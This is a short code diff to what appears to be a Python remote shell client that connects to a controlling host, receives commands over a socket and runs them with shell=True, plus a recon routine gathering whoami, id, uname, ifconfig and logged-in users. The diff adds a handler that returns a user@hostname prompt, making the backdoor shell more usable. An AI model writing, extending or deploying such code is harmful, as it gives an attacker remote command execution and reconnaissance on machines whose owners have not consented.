@@ -45,6 +45,8 @@ def ctrl_shell_client(host, port):
         inp = sockrecv(s)
         if inp == 'fin':
             break
+        elif inp == 'getprompt':
+            socksend(s, get_prompt())
         elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
             socksend(s, ctrl_shell_exec(inp))
         elif inp == 'recon':
@@ -65,7 +67,7 @@ def ctrl_shell_exec(inp):
 
 def ctrl_shell_recon():
     ts = str(datetime.now())
-    exec_str = 'exec "whoami" "id" "w" "who -a" "uname -a" "lsb_release -a"'
+    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "ifconfig" "w" "who -a"'
     out = ctrl_shell_exec(exec_str)
     return '{}\n\n{}'.format(ts, out)
 
@@ -73,6 +75,14 @@ def ctrl_shell_recon():
 def cmd_exec(cmd):
     return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                     shell=True).communicate()[0]
+
+
+def get_prompt():
+    user = cmd_exec('whoami').strip()
+    hn = cmd_exec('hostname').strip()
+    end = '#' if user == 'root' else '$'
+    aa = '{}@{} {} '.format(user, hn, end)
+    return aa
 
 
 def socksend(s, msg):
